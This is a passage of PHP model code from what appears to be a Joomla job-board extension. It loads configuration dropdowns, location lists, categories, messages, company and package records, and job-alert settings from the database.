            elseif ($conf->configname == "employer_defaultgroup")
                $employer_defaultgroup = $conf->configvalue;
            elseif ($conf->configname == "default_sharing_country")
                $default_sharing_country = $conf->configvalue;
            elseif ($conf->configname == "default_sharing_state")
                $default_sharing_state = $conf->configvalue;
            elseif ($conf->configname == "default_sharing_city")
                $default_sharing_city = $conf->configvalue;
        }
        $countries = $this->getSharingCountries(JText::_('JS_SELECT_COUNTRY'));
			if(empty($default_sharing_country)) $default_sharing_country=0;
			if(empty($default_sharing_state)) $default_sharing_state=0;
			if(empty($default_sharing_city)) $default_sharing_city=0;
			if($default_sharing_state!=0)$states = $this->getDefaultStatesForSharing(JText::_('JS_CHOOSE_STATE'),$default_sharing_country);
        if (($default_sharing_state != 0) AND ($default_sharing_city != 0)) {
            $cities = $this->getDefaultStateCitiesForSharing(JText::_('JS_CHOOSE_CITY'), $default_sharing_state);
        } elseif (($default_sharing_city != 0) AND ($default_sharing_country != 0)) {
            $cities = $this->getDefaultCitiesForSharing(JText::_('JS_CHOOSE_CITY'), $default_sharing_country);
        }

        $joomla_groups = $this->getUserGroups();
        $employerpackages = $this->getFreeEmployerPackageForCombo(JText::_('JS_NO'));
        $jobseekerpacakges = $this->getFreeJobSeekerPackageForCombo(JText::_('JS_NO'));
        $lists['defaultcountry'] = JHTML::_('select.genericList', $countries, 'defaultcountry', 'class="inputbox" ' . '', 'value', 'text', $this->_defaultcountry);
        $lists['defaultsharingcountry'] = JHTML::_('select.genericList', $countries, 'default_sharing_country', 'class="inputbox" ' . 'onChange="dochange(\'defaultsharingstate\', this.value)"', 'value', 'text', $default_sharing_country);
			if ( isset($states[1]) ) $lists['defaultsharingstate'] = JHTML::_('select.genericList', $states, 'default_sharing_state', 'class="inputbox" '.'onChange="dochange(\'defaultsharingcity\', this.value)"', 'value', 'text', $default_sharing_state);
			if ( isset($cities[1]) )$lists['defaultsharingcity'] = JHTML::_('select.genericList', $cities, 'default_sharing_city', 'class="inputbox" '.'', 'value', 'text', $default_sharing_city);
        $lists['employer_defaultpackage'] = JHTML::_('select.genericList', $employerpackages, 'employer_defaultpackage', 'class="inputbox" ' . '', 'value', 'text', $employer_defaultpackage);
        $lists['jobseeker_defaultpackage'] = JHTML::_('select.genericList', $jobseekerpacakges, 'jobseeker_defaultpackage', 'class="inputbox" ' . '', 'value', 'text', $jobseeker_defaultpackage);
        $lists['jobseeker_group'] = JHTML::_('select.genericList', $joomla_groups, 'jobseeker_defaultgroup', 'class="inputbox" ' . '', 'value', 'text', $jobseeker_defaultgroup);
        $lists['employer_group'] = JHTML::_('select.genericList', $joomla_groups, 'employer_defaultgroup', 'class="inputbox" ' . '', 'value', 'text', $employer_defaultgroup);

        $result[0] = $this->_config;
        $result[1] = $lists;
        return $result;
    }

    function getSharingCountries($title) {
        $db = & JFactory::getDBO();
        $query = "SELECT serverid AS id,name FROM `#__js_job_countries` WHERE enabled = 1";
        if ($this->_client_auth_key != "")
            $query.=" AND serverid!='' AND serverid!=0";
        $query.= " ORDER BY name ASC ";

        $db->setQuery($query);
        $rows = $db->loadObjectList();
        if ($db->getErrorNum()) {
            echo $db->stderr();
            return false;
        }
        $countries = array();
		if ($title) $countries[] =  array('value' => JText::_(''),'text' => $title);
		else $countries[] =  array('value' => JText::_(''),'text' => JText::_('==== choose country ===='));
        foreach ($rows as $row) {
            $countries[] = array('value' => $row->id,
                'text' => JText::_($row->name));
        }
        return $countries;
    }

    function getDefaultStatesForSharing($title, $countryid) {
        if(!is_numeric($countryid)) return false;
        $states = array();
        $db = & JFactory::getDBO();
        $query = "SELECT serverid AS id,name FROM `#__js_job_states` WHERE enabled = 1 AND countryid=" . $countryid;
        if ($this->_client_auth_key != "")
            $query.=" AND serverid!='' AND serverid!=0";
        $query.= " ORDER BY name ASC ";
        $db->setQuery($query);
        $rows = $db->loadObjectList();
        if ($db->getErrorNum()) {
            echo $db->stderr();
            return false;
        }
        if ($title)
            $states[] = array('value' => JText::_(''), 'text' => $title);

        foreach ($rows as $row) {
            $states[] = array('value' => $row->id, 'text' => JText::_($row->name));
        }
        return $states;
    }

    function getDefaultStateCitiesForSharing($title, $stateid) {
        if(!is_numeric($stateid)) return false;
        $cities = array();
        $db = & JFactory::getDBO();
        $query = "SELECT serverid AS id,name FROM `#__js_job_cities` WHERE enabled = 1 AND stateid=" . $stateid;
        if ($this->_client_auth_key != "")
            $query.=" AND serverid!='' AND serverid!=0";
        $query.= " ORDER BY name ASC ";

        $db->setQuery($query);
        $rows = $db->loadObjectList();
        if ($db->getErrorNum()) {
            echo $db->stderr();
            return false;
        }
        if ($title)
            $cities[] = array('value' => JText::_(''), 'text' => $title);
        foreach ($rows as $row) {
            $cities[] = array('value' => $row->id, 'text' => JText::_($row->name));
        }
        return $cities;
    }

    function getDefaultCitiesForSharing($title, $countryid) {
        if(!is_numeric($countryid)) return false;
        $cities = array();
        $db = & JFactory::getDBO();
        $query = "SELECT serverid AS id,name FROM `#__js_job_cities` WHERE enabled = 1 AND countryid=" . $countryid;
        if ($this->_client_auth_key != "")
            $query.=" AND serverid!='' AND serverid!=0";
        $query.= " ORDER BY name ASC ";
        $db->setQuery($query);
        $rows = $db->loadObjectList();
        if ($db->getErrorNum()) {
            echo $db->stderr();
            return false;
        }
        if ($title)
            $cities[] = array('value' => JText::_(''), 'text' => $title);
        foreach ($rows as $row) {
            $cities[] = array('value' => $row->id, 'text' => JText::_($row->name));
        }

        return $cities;
    }

    function getUserGroups() {
        $version = new JVersion;
        $joomla = $version->getShortVersion();
        $jversion = substr($joomla, 0, 3);
        $db = & JFactory :: getDBO();
        if ($jversion == '1.5') {
            $query = "SELECT id,name AS name FROM #__core_acl_aro_groups";
            $db->setQuery($query);
            $usergroup = $db->loadObjectList();
        } else {
            $query = "SELECT id,title AS name FROM #__usergroups";
            $db->setQuery($query);
            $usergroup = $db->loadObjectList();
        }
        $groups = array();
		$groups[] = array('value' => '', 'text' => JText::_('JS_SELECT_USER_GROUP'));
        foreach ($usergroup as $row) {
            $groups[] = array('value' => $row->id, 'text' => JText::_($row->name));
        }
        return $groups;
    }

    function & getTemplate($tempfor) {
        $db = & JFactory :: getDBO();
        switch ($tempfor) {
            case 'ew-cm' : $tempatefor = 'company-new';
                break;
            case 'cm-ap' : $tempatefor = 'company-approval';
                break;
            case 'cm-rj' : $tempatefor = 'company-rejecting';
                break;
            case 'ew-ob' : $tempatefor = 'job-new';
                break;
            case 'ob-ap' : $tempatefor = 'job-approval';
                break;
            case 'ob-rj' : $tempatefor = 'job-rejecting';
                break;
            case 'ap-rs' : $tempatefor = 'applied-resume_status';
                break;
            case 'ew-rm' : $tempatefor = 'resume-new';
                break;
            case 'rm-ap' : $tempatefor = 'resume-approval';
                break;
            case 'ew-ms' : $tempatefor = 'message-email';
                break;
            case 'rm-rj' : $tempatefor = 'resume-rejecting';
                break;
            case 'ba-ja' : $tempatefor = 'jobapply-jobapply';
                break;
            case 'ew-md' : $tempatefor = 'department-new';
                break;
            case 'ew-rp' : $tempatefor = 'employer-buypackage';
                break;
            case 'ew-js' : $tempatefor = 'jobseeker-buypackage';
                break;
            case 'ms-sy' : $tempatefor = 'message-email';
                break;
            case 'jb-at' : $tempatefor = 'job-alert';
                break;
            case 'jb-at-vis' : $tempatefor = 'job-alert-visitor';
                break;
            case 'jb-to-fri' : $tempatefor = 'job-to-friend';
                break;
        }
        $query = "SELECT * FROM #__js_job_emailtemplates WHERE templatefor = " . $db->Quote($tempatefor);
        $db->setQuery($query);
        $template = $db->loadObject();
        return $template;
    }

    function & getCategorybyId($c_id) {
        if (is_numeric($c_id) == false)
            return false;
        $db = & JFactory :: getDBO();
        $query = "SELECT * FROM #__js_job_categories WHERE id = " . $c_id;
        $db->setQuery($query);
        $category = $db->loadObject();
        return $category;
    }

    function & getSubCategorybyId($c_id, $categoryid) {
        if ($c_id)
            if (is_numeric($c_id) == false)
                return false;
        if ($categoryid)
            if (is_numeric($categoryid) == false)
                return false;
        $db = & JFactory :: getDBO();
        if ($c_id) {
            $query = "SELECT subcategory.*,category.cat_title FROM #__js_job_subcategories AS subcategory
						JOIN #__js_job_categories AS category ON category.id = subcategory.categoryid
						WHERE subcategory.id = " . $c_id;
        } elseif ($categoryid) {
            $query = "SELECT category.cat_title ,category.id AS categoryid FROM #__js_job_categories AS category WHERE category.id = " . $categoryid;
        }
        $db->setQuery($query);
        $subcategory = $db->loadObject();
        return $subcategory;
    }

    function & getJobTypebyId($c_id) {
        if (is_numeric($c_id) == false)
            return false;
        $db = & JFactory :: getDBO();
        $query = "SELECT * FROM #__js_job_jobtypes WHERE id = " . $c_id;
        $db->setQuery($query);
        $jobtype = $db->loadObject();
        return $jobtype;
    }

    function & getJobAgesbyId($c_id) {
        if (is_numeric($c_id) == false)
            return false;
        $db = & JFactory :: getDBO();
        $query = "SELECT * FROM #__js_job_ages WHERE id = " . $c_id;
        $db->setQuery($query);
        $ages = $db->loadObject();
        return $ages;
    }

    function & getCurrencybyId($c_id) {
        if (is_numeric($c_id) == false)
            return false;
        $db = & JFactory :: getDBO();
        $query = "SELECT * FROM #__js_job_currencies WHERE id = " . $c_id;
        $db->setQuery($query);
        $currency = $db->loadObject();
        return $currency;
    }

    function & getJobCareerLevelbyId($c_id) {
        if (is_numeric($c_id) == false)
            return false;
        $db = & JFactory :: getDBO();
        $query = "SELECT * FROM #__js_job_careerlevels WHERE id = " . $c_id;
        $db->setQuery($query);
        $career = $db->loadObject();
        return $career;
    }

    function & getJobExperiencebyId($c_id) {
        if (is_numeric($c_id) == false)
            return false;
        $db = & JFactory :: getDBO();
        $query = "SELECT * FROM #__js_job_experiences WHERE id = " . $c_id;

        $db->setQuery($query);
        $experience = $db->loadObject();
        return $experience;
    }

    function & getSalaryRangeTypebyId($c_id) {
        if (is_numeric($c_id) == false)
            return false;
        $db = & JFactory :: getDBO();
        $query = "SELECT * FROM #__js_job_salaryrangetypes WHERE id = " . $c_id;

        $db->setQuery($query);
        $jobtype = $db->loadObject();
        return $jobtype;
    }

    function & getJobStatusbyId($c_id) {
        if (is_numeric($c_id) == false)
            return false;
        $db = & JFactory :: getDBO();
        $query = "SELECT * FROM #__js_job_jobstatus WHERE id = " . $c_id;

        $db->setQuery($query);
        $jobstatus = $db->loadObject();
        return $jobstatus;
    }

    function & getShiftbyId($c_id) {
        if (is_numeric($c_id) == false)
            return false;
        $db = & JFactory :: getDBO();
        $query = "SELECT * FROM #__js_job_shifts WHERE id = " . $c_id;

        $db->setQuery($query);
        $shift = $db->loadObject();
        return $shift;
    }

    function & getMessagesbyId($id) {
        if (is_numeric($id) == false)
            return false;
        $db = & JFactory :: getDBO();

        $query = "SELECT * FROM #__js_job_messages WHERE id = " . $id;
        $db->setQuery($query);

        $message = $db->loadObject();
        $status = array(
            '0' => array('value' => 0, 'text' => JText::_('JS_PENDDING')),
            '1' => array('value' => 1, 'text' => JText::_('JS_APPROVE')),
            '2' => array('value' => -1, 'text' => JText::_('JS_REJECT')),);
        $lists['status'] = JHTML::_('select.genericList', $status, 'status', 'class="inputbox required" ' . '', 'value', 'text', $message->status);
        $result[0] = $message;
        $result[1] = $lists;
        return $result;
    }

    function &getMessagesbyJobResume($uid, $jobid, $resumeid, $limit, $limitstart) {
        $result = array();
        $db = &$this->getDBO();
        if (is_numeric($uid) == false)
            return false;
        if ((is_numeric($uid) == false) || ($uid == 0) || ($uid == ''))
            return false;
        if (is_numeric($jobid) == false)
            return false;
        if (is_numeric($resumeid) == false)
            return false;
        $listjobconfig = $this->getConfigByFor('listjob');
        $query = "SELECT count(message.id)
                        FROM `#__js_job_messages` AS message
                        WHERE message.status = 1 AND message.jobid =" . $jobid . " AND message.resumeid = " . $resumeid;
        $db->setQuery($query);
        $total = $db->loadResult();
        if ($total <= $limitstart)
            $limitstart = 0;

        $query = "SELECT message.*, job.title, resume.application_title, resume.first_name, resume.middle_name, resume.last_name
				FROM `#__js_job_messages` AS message
				JOIN `#__js_job_jobs` AS job ON job.id = message.jobid
				JOIN `#__js_job_resume` AS resume ON resume.id = message.resumeid
				WHERE message.status = 1 AND message.jobid =" . $jobid . " AND message.resumeid = " . $resumeid . " ORDER BY  message.created DESC";

        $db->setQuery($query, $limitstart, $limit);
        $messages = $db->loadObjectList();
        $query = "SELECT job.id as jobid, job.uid as employerid, job.title, resume.id as resumeid, resume.uid as jobseekerid, resume.application_title, resume.first_name, resume.middle_name, resume.last_name
						FROM `#__js_job_jobs` AS job
						JOIN `#__js_job_resume` AS resume ON resume.id = " . $resumeid . "
						WHERE job.id = " . $jobid;
        $db->setQuery($query);
        $summary = $db->loadObject();
        $result[0] = $messages;
        $result[1] = $total;
        $result[3] = $summary;

        return $result;
    }

    function &getMessagesbyJobResumes($uid, $jobid, $resumeid) {
        $result = array();
        $db = &$this->getDBO();
        if ((is_numeric($uid) == false) || ($uid == 0) || ($uid == ''))
            return false;
        if (is_numeric($jobid) == false)
            return false;
        if (is_numeric($resumeid) == false)
            return false;
        $status = array(
            '0' => array('value' => 0, 'text' => JText::_('JS_PENDDING')),
            '1' => array('value' => 1, 'text' => JText::_('JS_APPROVE')),
            '2' => array('value' => -1, 'text' => JText::_('JS_REJECT')),);
        $lists['status'] = JHTML::_('select.genericList', $status, 'status', 'class="inputbox required" ' . '', 'value', 'text', $message->status);
        $query = "SELECT message.*, job.title, resume.application_title, resume.first_name, resume.middle_name, resume.last_name
				FROM `#__js_job_messages` AS message
				JOIN `#__js_job_jobs` AS job ON job.id = message.jobid
				JOIN `#__js_job_resume` AS resume ON resume.id = message.resumeid
				WHERE message.status = 1 AND message.jobid =" . $jobid . " AND message.resumeid = " . $resumeid . " ORDER BY  message.created DESC";

        $db->setQuery($query, $limitstart, $limit);
        $messages = $db->loadObjectList();
        $query = "SELECT job.id as jobid, job.uid as employerid, job.title, resume.id as resumeid, resume.uid as jobseekerid, resume.application_title, resume.first_name, resume.middle_name, resume.last_name
						FROM `#__js_job_jobs` AS job
						JOIN `#__js_job_resume` AS resume ON resume.id = " . $resumeid . "
						WHERE job.id = " . $jobid;

        $db->setQuery($query);
        $summary = $db->loadObject();
        $result[0] = $messages;
        $result[1] = $summary;
        $result[2] = $lists;

        return $result;
    }

    function & getHighestEducationbyId($c_id) {
        if (is_numeric($c_id) == false)
            return false;
        $db = & JFactory :: getDBO();
        $query = "SELECT * FROM #__js_job_heighesteducation WHERE id = " . $c_id;

        $db->setQuery($query);
        $education = $db->loadObject();
        return $education;
    }

    function & getFolderbyId($c_id) {
        if (is_numeric($c_id) == false)
            return false;
        $db = & JFactory :: getDBO();
        $query = "SELECT * FROM #__js_job_folders WHERE id = " . $c_id;

        $db->setQuery($query);
        $folders = $db->loadObject();
        $result[0] = $folders;
        $lists = '';
        $status = array(
            '0' => array('value' => 0, 'text' => JText::_('JS_PENDDING')),
            '1' => array('value' => 1, 'text' => JText::_('JS_APPROVE')),
            '2' => array('value' => -1, 'text' => JText::_('JS_REJECT')),);
        if ($folders) {
            $lists['status'] = JHTML::_('select.genericList', $status, 'status', 'class="inputbox required" ' . '', 'value', 'text', $folders->status);
        } else {
            $lists['status'] = JHTML::_('select.genericList', $status, 'status', 'class="inputbox required" ' . '', 'value', 'text', '');
        }
        $result[1] = $lists;
        return $result;
    }

    function & getCompanybyId($c_id) {
        if (is_numeric($c_id) == false)
            return false;
        $db = & JFactory :: getDBO();
        $query = "SELECT * FROM #__js_job_companies WHERE id = " . $c_id;

        $db->setQuery($query);
        $company = $db->loadObject();

        $status = array(
            '0' => array('value' => 0, 'text' => JText::_('JS_PENDDING')),
            '1' => array('value' => 1, 'text' => JText::_('JS_APPROVE')),
            '2' => array('value' => -1, 'text' => JText::_('JS_REJECT')),);


        if (isset($company)) {
            $lists['category'] = JHTML::_('select.genericList', $this->getCategories('', ''), 'category', 'class="inputbox required" ' . '', 'value', 'text', $company->category);
            $lists['status'] = JHTML::_('select.genericList', $status, 'status', 'class="inputbox required" ' . '', 'value', 'text', $company->status);
            $multi_lists = $this->getMultiSelectEdit($c_id, 2);
        } else {
            if (!isset($this->_config)) {
                $this->getConfig();
            }
            $lists['category'] = JHTML::_('select.genericList', $this->getCategories('', ''), 'category', 'class="inputbox required" ' . '', 'value', 'text', '');
            $lists['status'] = JHTML::_('select.genericList', $status, 'status', 'class="inputbox required" ' . '', 'value', 'text', '');
        }
        $result[0] = $company;
        $result[1] = $lists;
        $result[2] = $this->getUserFieldsforForm(1, $c_id); // company fields, id
        $result[3] = $this->getFieldsOrderingforForm(1); // company fields
        if (isset($multi_lists))
            $result[4] = $multi_lists;

        return $result;
    }

    function getMultiSelectEdit($id, $for) {
        if(!is_numeric($id)) return false;
        $db = JFactory::getDbo();
        $config = $this->getConfigByFor('default');
        $query = "SELECT city.id AS id, concat(city.cityName";
        switch ($config['defaultaddressdisplaytype']) {
            case 'csc'://City, State, Country
                $query .= " ,', ', (IF(state.name is not null,state.name,'')),IF(state.name is not null,', ',''),country.name)";
                break;
            case 'cs'://City, State
                $query .= " ,', ', (IF(state.name is not null,state.name,'')))";
                break;
            case 'cc'://City, Country
                $query .= " ,', ', country.name)";
                break;
            case 'c'://city by default select for each case
                $query .= ")";
                break;
        }
        $query .= " AS name ";
        switch ($for) {
            case 1:
                $query .= " FROM `#__js_job_jobcities` AS mcity";
                break;
            case 2:
                $query .= " FROM `#__js_job_companycities` AS mcity";
                break;
            case 3:
                $query .= " FROM `#__js_job_jobalertcities` AS mcity";
                break;
        }
        $query .=" JOIN `#__js_job_cities` AS city on city.id=mcity.cityid
		  JOIN `#__js_job_countries` AS country on city.countryid=country.id
		  LEFT JOIN `#__js_job_states` AS state on city.stateid=state.id";
        switch ($for) {
            case 1:
                $query .= " WHERE mcity.jobid = $id AND country.enabled = 1 AND city.enabled = 1";
                break;
            case 2:
                $query .= " WHERE mcity.companyid = $id AND country.enabled = 1 AND city.enabled = 1";
                break;
            case 3:
                $query .= " WHERE mcity.alertid = $id AND country.enabled = 1 AND city.enabled = 1";
                break;
        }

        $db->setQuery($query);
        $result = $db->loadObjectList();
        $json_array = json_encode($result);
        if (empty($json_array))
            return null;
        else
            return $json_array;
    }

    function & getJobSeekerPackagebyId($c_id) {
        if (is_numeric($c_id) == false)
            return false;
        $db = & JFactory :: getDBO();
        $query = "SELECT * FROM #__js_job_jobseekerpackages WHERE id = " . $c_id;
        $db->setQuery($query);
        $package = $db->loadObject();
        $status = array(
            '0' => array('value' => 0, 'text' => JText::_('JS_UNPUBLISHED')),
            '1' => array('value' => 1, 'text' => JText::_('JS_PUBLISHED')),);
        $type = array(
            '0' => array('value' => 1, 'text' => JText::_('Amount')),
            '1' => array('value' => 2, 'text' => JText::_('%')),);
        $yesNo = array(
            '0' => array('value' => 1, 'text' => JText::_('yes')),
            '1' => array('value' => 0, 'text' => JText::_('No')),);

        if (isset($package)) {
            $lists['status'] = JHTML::_('select.genericList', $status, 'status', 'class="inputbox required" ' . '', 'value', 'text', $package->status);
            $lists['type'] = JHTML::_('select.genericList', $type, 'discounttype', 'class="inputbox required" ' . '', 'value', 'text', $package->discounttype);
            $lists['jobsearch'] = JHTML::_('select.genericList', $yesNo, 'jobsearch', 'class="inputbox required" ' . '', 'value', 'text', $package->jobsearch);
            $lists['savejobsearch'] = JHTML::_('select.genericList', $yesNo, 'savejobsearch', 'class="inputbox required" ' . '', 'value', 'text', $package->savejobsearch);
            $lists['jobalertsetting'] = JHTML::_('select.genericList', $yesNo, 'jobalertsetting', 'class="inputbox required" ' . '', 'value', 'text', $package->jobalertsetting);
            $lists['currency'] = JHTML::_('select.genericList', $this->getCurrency(), 'currencyid', 'class="inputbox" ' . '', 'value', 'text', $package->currencyid);
        } else {
            $lists['status'] = JHTML::_('select.genericList', $status, 'status', 'class="inputbox required" ' . '', 'value', 'text', '');
            $lists['type'] = JHTML::_('select.genericList', $type, 'discounttype', 'class="inputbox required" ' . '', 'value', 'text', '');
            $lists['jobsearch'] = JHTML::_('select.genericList', $yesNo, 'jobsearch', 'class="inputbox required" ' . '', 'value', 'text', '');
            $lists['savejobsearch'] = JHTML::_('select.genericList', $yesNo, 'savejobsearch', 'class="inputbox required" ' . '', 'value', 'text', '');
            $lists['jobalertsetting'] = JHTML::_('select.genericList', $yesNo, 'jobalertsetting', 'class="inputbox required" ' . '', 'value', 'text', '');
            $lists['currency'] = JHTML::_('select.genericList', $this->getCurrency(), 'currencyid', 'class="inputbox" ' . '', 'value', 'text', '');
        }

        $result[0] = $package;
        $result[1] = $lists;
        $result[2] = $this->getConfigByFor('payment');

        return $result;
    }

    function getDepartmentsByCompanyId($companyid, $title) {
        if ($companyid)
            if (is_numeric($companyid) == false)
                return false;
        $db = & JFactory::getDBO();
        $departments = array();
        if ($companyid) {
            $query = "SELECT id, name FROM `#__js_job_departments` WHERE status = 1 AND companyid = " . $companyid . " ORDER BY name ASC ";
            $db->setQuery($query);
            $rows = $db->loadObjectList();
            if ($db->getErrorNum()) {
                echo $db->stderr();
                return false;
            }

            if ($title)
                $departments[] = array('value' => JText::_(''), 'text' => $title);
            foreach ($rows as $row) {
                $departments[] = array('value' => $row->id, 'text' => $row->name);
            }
        }
        return $departments;
    }

    function storeJobAlertSetting() { //store job alert setting
        $row = &$this->getTable('jobalertsetting');
        $data = JRequest :: get('post');
        $email = $data['contactemail'];
        if ($data['id'] == '') { // only for new 
            if ($this->emailValidation($email))
                return 3;
            $data['lastmailsend'] = date('Y-m-d H:i:s');
        }
        if (!$row->bind($data)) {
            $this->setError($this->_db->getErrorMsg());
            return false;
        }
        if (!$row->check()) {
            $this->setError($this->_db->getErrorMsg());
            return 2;
        }
        if (!$row->store()) {
            $this->setError($this->_db->getErrorMsg());
            return false;
        }
        if ($data['city'])
            $storemulticity = $this->storeMultiJobAlertCities($data['city'], $row->id);
        if ($storemulticity == false)
            return false;

        if ($this->_client_auth_key != "") {
            $db = &$this->getDBO();
            $query = "SELECT jobalert.* FROM `#__js_job_jobalertsetting` AS jobalert  
						WHERE jobalert.id = " . $row->id;

            $db->setQuery($query);
            $data_jobalert = $db->loadObject();
            if ($data['id'] != "" AND $data['id'] != 0)
                $data_jobalert->id = $data['id']; // for edit case
            $data_jobalert->jobalert_id = $row->id;
            $data_jobalert->authkey = $this->_client_auth_key;
            $data_jobalert->task = 'storejobalert';
            $jsjobsharingobject = new JSJobsModelJobSharing;
            $return_value = $jsjobsharingobject->storeJobAlertSharing($data_jobalert);
            return $return_value;
        }else {
            return true;
        }
    }

    function storeMultiJobAlertCities($city_id, $alertid) { // city id comma seprated 
        if(!is_numeric($alertid)) return false;
        $db = & JFactory::getDBO();
        $query = "SELECT cityid FROM #__js_job_jobalertcities WHERE alertid = " . $alertid;
        $db->setQuery($query);
        $old_cities = $db->loadObjectList();

        $id_array = explode(",", $city_id);
        $row = &$this->getTable('jobalertcities');
        $error = array();

        foreach ($old_cities AS $oldcityid) {
            $match = false;
            foreach ($id_array AS $cityid) {
                if ($oldcityid->cityid == $cityid) {
                    $match = true;
                    break;
                }
            }
            if ($match == false) {
                $query = "DELETE FROM #__js_job_jobalertcities WHERE alertid = " . $alertid . " AND cityid=" . $oldcityid->cityid;
                $db->setQuery($query);
                if (!$db->query()) {
                    $err = $this->setError($this->_db->getErrorMsg());
                    $error[] = $err;
                }
            }
        }


        foreach ($id_array AS $cityid) {
            $insert = true;
            foreach ($old_cities AS $oldcityid) {
                if ($oldcityid->cityid == $cityid) {
                    $insert = false;
                    break;
                }
            }
            if ($insert) {
                $row->id = "";
                $row->alertid = $alertid;
                $row->cityid = $cityid;
                if (!$row->store()) {
                    $err = $this->setError($this->_db->getErrorMsg());
                    $error[] = $err;
                }
            }
        }
        if (!empty($error))
            return false;
        return true;
    }

    function emailValidation($email) {
        $db = & JFactory:: getDBO();
        $query = "SELECT COUNT(id) FROM `#__js_job_jobalertsetting` WHERE contactemail = " . $db->Quote($email);
        $db->setQuery($query);
        $result = $db->loadResult();
        if ($result > 0)
            return true;
        else
            return false;
    }

    function &getJobAlertbyIdforForm($id) {
        $db = &$this->getDBO();
        if ($id)
            if ((is_numeric($id) == false) || ($id == 0) || ($id == ''))
                return false;
        $status = array(
            '0' => array('value' => 1, 'text' => JText::_('JS_APPROVE')),
            '1' => array('value' => -1, 'text' => JText::_('JS_REJECT')),);

        $query = "SELECT jobset.*
			FROM `#__js_job_jobalertsetting` AS jobset
			WHERE jobset.id = " . $id;

        $db->setQuery($query);
        $setting = $db->loadObject();

        $alerttype = $this->getAlerttype('', '');
        $categories = $this->getCategories('', '');
        if (isset($setting)) {
			if($setting->categoryid) $categoryid = $setting->categoryid; else $categoryid = $categories[0]['value'];
			if($setting->subcategoryid) $subcategoryid = $setting->subcategoryid; else $subcategoryid = '';
            $lists['jobcategory'] = JHTML::_('select.genericList', $categories, 'categoryid', 'class="inputbox" ' . 'onChange="fj_getsubcategories(\'fj_subcategory\', this.value)"', 'value', 'text', $categoryid);
            $lists['subcategory'] = JHTML::_('select.genericList', $this->getSubCategoriesforCombo($categoryid, JText::_('JS_SUB_CATEGORY'), ''), 'subcategoryid', 'class="inputbox" ' . '', 'value', 'text', $subcategoryid);
            $lists['alerttype'] = JHTML::_('select.genericList', $alerttype, 'alerttype', 'class="inputbox required" ' . '', 'value', 'text', $setting->alerttype);
            $lists['status'] = JHTML::_('select.genericList', $status, 'status', 'class="inputbox" ' . '', 'value', 'text', $setting->status);
            $multi_lists = $this->getMultiSelectEdit($setting->id, 3);
        }else {
            $lists['jobcategory'] = JHTML::_('select.genericList', $categories, 'categoryid', 'class="inputbox" ' . 'onChange="fj_getsubcategories(\'fj_subcategory\', this.value)"', 'value', 'text', '');
            $lists['subcategory'] = JHTML::_('select.genericList', $this->getSubCategoriesforCombo($categories[0]['value'], JText::_('JS_SUB_CATEGORY'), ''), 'subcategoryid', 'class="inputbox" ' . '', 'value', 'text', '');
            $lists['alerttype'] = JHTML::_('select.genericList', $alerttype, 'alerttype', 'class="inputbox required" ' . '', 'value', 'text', '');
            $lists['status'] = JHTML::_('select.genericList', $status, 'status', 'class="inputbox" ' . '', 'value', 'text', $setting->status);
        }
        if (isset($setting))
            $result[0] = $setting;
        $result[1] = $lists;

        if (isset($multi_lists) && $multi_lists != "")
            $result[2] = $multi_lists;

        return $result;
    }

    function getAlerttype($alert_type, $title) {
        $alerttype = array();
        if ($title)
            $alerttype[] = array('value' => JText::_(''), 'text' => $title);
        else
            $alerttype[] = array('value' => JText::_(''), 'text' => JText::_('JS_CHOOSE_ALERT_TYPE'));

        $alerttype[] = array('value' => 1, 'text' => JText::_('JS_DAILY'));
        $alerttype[] = array('value' => 2, 'text' => JText::_('JS_WEEKLY'));
        $alerttype[] = array('value' => 3, 'text' => JText::_('JS_MONTHLY'));
        return $alerttype;
    }

    function unSubscribeJobAlert($alertid) {
        if(!is_numeric($alertid)) return false;
        $db = &$this->getDBO();
        $row = &$this->getTable('jobalertsetting');
        if ($this->_client_auth_key != "") {
            $query = "SELECT jobalert.id,jobalert.serverid FROM `#__js_job_jobalertsetting` AS jobalert
							WHERE jobalert.id = " . $alertid;

            $db->setQuery($query);
            $alert_data = $db->loadObject();
            $data['authkey'] = $this->_client_auth_key;
            $data['task'] = 'unsunscribejobalert';
            $data['id'] = $alert_data->serverid;
            $data['jobalert_id'] = $alert_data->id;
            $jsjobsharingobject = new JSJobsModelJobSharing;
            $return_value = $jsjobsharingobject->unsubscribeJobAlert($data);
        }
        $query = "DELETE jobalert,acity
					FROM `#__js_job_jobalertsetting` AS jobalert
					LEFT JOIN `#__js_job_jobalertcities` AS acity ON acity.alertid=jobalert.id 
			WHERE jobalert.id = " . $alertid;
        $db->setQuery($query);
        if (!$db->query()) {
            return false;
        }
        if ($this->_client_auth_key != "")
            return $return_value;
        else
            return true;
    }

    function & getJobbyId($c_id, $uid) {
        if ($uid)
            if ((is_numeric($uid) == false) || ($uid == 0) || ($uid == ''))
                return false;
        if (is_numeric($c_id) == false)
            return false;
        $db = & JFactory :: getDBO();

        $query = "SELECT job.*, cat.cat_title, salary.rangestart, salary.rangeend
			FROM `#__js_job_jobs` AS job
			JOIN `#__js_job_categories` AS cat ON job.jobcategory = cat.id
			LEFT JOIN `#__js_job_salaryrange` AS salary ON job.jobsalaryrange = salary.id
			LEFT JOIN `#__js_job_currencies` AS currency ON currency.id = job.currencyid 
			WHERE job.id = " . $c_id;

        $db->setQuery($query);
        $this->_job = $db->loadObject();

        $status = array(
            '0' => array('value' => 0, 'text' => JText::_('JS_PENDDING')),
            '1' => array('value' => 1, 'text' => JText::_('JS_APPROVE')),
            '2' => array('value' => -1, 'text' => JText::_('JS_REJECT')),);
        $companies = $this->getCompanies($uid);
        $departments = $this->getDepartment($uid);
        $categories = $this->getCategories('', '');

        if (isset($this->_job)) {
            $lists['companies'] = JHTML::_('select.genericList', $companies, 'companyid', 'class="inputbox required" ' . '', 'value', 'text', $this->_job->companyid);
            $lists['departments'] = JHTML::_('select.genericList', $this->getDepartmentsByCompanyId($this->_job->companyid, ''), 'departmentid', 'class="inputbox" ' . '', 'value', 'text', $this->_job->departmentid);
            $lists['jobcategory'] = JHTML::_('select.genericList', $categories, 'jobcategory', 'class="inputbox" ' . 'onChange="fj_getsubcategories(\'fj_subcategory\', this.value)"', 'value', 'text', $this->_job->jobcategory);
            $lists['subcategory'] = JHTML::_('select.genericList', $this->getSubCategoriesforCombo($this->_job->jobcategory, JText::_('JS_SUB_CATEGORY'), ''), 'subcategoryid', 'class="inputbox" ' . '', 'value', 'text', $this->_job->subcategoryid);
            $lists['jobtype'] = JHTML::_('select.genericList', $this->getJobType(''), 'jobtype', 'class="inputbox" ' . '', 'value', 'text', $this->_job->jobtype);
